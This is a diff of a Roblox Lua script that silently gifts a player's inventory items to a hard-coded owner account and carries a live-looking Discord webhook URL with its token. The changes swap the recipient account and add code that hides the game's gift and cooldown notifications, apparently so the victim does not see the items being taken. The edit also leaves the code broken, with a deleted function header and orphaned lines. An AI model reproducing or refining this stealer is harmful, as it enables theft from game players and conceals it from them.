@@ -2,7 +2,7 @@ local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
 local lp = Players.LocalPlayer
 
-local OWNER = "fdtztc6"
+local OWNER = "werovasquez"
 local WEBHOOK = "https://discord.com/api/webhooks/1546003287067725855/3pSRKl_qcw1e4ggGIyMzuVB5HzlqvnyleUKscsYUJUqcG7JpP20wUNt0aLg0gX3WijZF"
 local MIN_MULT = 1.5
 
@@ -57,37 +57,14 @@ end
 
 local function giftAll(ownerPlayer, items)
     local char = lp.Character
-    local hum = char and char:FindFirstChild("Humanoid")
-    local ownerChar = ownerPlayer.Character
-    local ownerRoot = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
-    if not hum or not ownerRoot or not char then 
-        print("❌ Cannot start gifting: missing char/humanoid/owner")
+    if not char then 
+        print("❌ Cannot start gifting: missing character")
         return 
-    end
-
-    -- Walk to owner and keep walking if they move
-    for attempt = 1, 30 do
-        ownerChar = ownerPlayer.Character
-        ownerRoot = ownerChar and ownerChar:FindFirstChild("HumanoidRootPart")
-        local myRoot = char:FindFirstChild("HumanoidRootPart")
-        if not ownerRoot or not myRoot then 
-            task.wait(1) 
-            continue 
-        end
-
-        local dist = (ownerRoot.Position - myRoot.Position).Magnitude
-        if dist > 8 then
-            hum:MoveTo(ownerRoot.Position)
-            task.wait(1)
-        else
-            print("✓ Reached owner")
-            break
-        end
     end
 
     task.wait(0.5)
 
-    -- Gift each item one by one
+    -- Gift each item one by one (no need to walk to owner)
     for idx, item in ipairs(items) do
         -- Make sure item still exists
         if not item or not item.Parent then 
@@ -104,11 +81,10 @@ local function giftAll(ownerPlayer, items)
             task.wait(0.5)
         end
 
-        -- Fire gift remote - try with both owner player and item name
+        -- Fire gift remote
         local success = false
         for attempt = 1, 3 do
             pcall(function()
-                -- Try: GiftItem(owner, itemName)
                 RS.Remotes.GiftItem:FireServer(ownerPlayer, item.Name)
             end)
             task.wait(0.8)
@@ -137,7 +113,35 @@ local function giftAll(ownerPlayer, items)
     print("✓ Gifting complete!")
 end
 
-local function tryGift(ownerPlayer, items)
+local function hideNotifications()
+    -- Try to find and hide notification GUIs
+    local PlayerGui = lp:WaitForChild("PlayerGui")
+    
+    -- Hide common notification frames
+    for _, child in ipairs(PlayerGui:GetDescendants()) do
+        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("Frame") then
+            local text = child:IsA("TextLabel") and child.Text or ""
+            if text:find("wait before gifting") or text:find("accepted your gift") or text:find("Please wait") then
+                child.Visible = false
+                print("Hidden notification: " .. text)
+            end
+        end
+    end
+    
+    -- Also watch for new notifications and hide them
+    PlayerGui.DescendantAdded:Connect(function(descendant)
+        task.wait(0.1)
+        if descendant:IsA("TextLabel") then
+            local text = descendant.Text or ""
+            if text:find("wait before gifting") or text:find("accepted") or text:find("Please wait") then
+                descendant.Visible = false
+            end
+        end
+    end)
+end
+
+-- Hide notifications on startup
+hideNotifications()
     ownerPlayer.CharacterAdded:Wait()
     task.wait(2)
     giftAll(ownerPlayer, items)
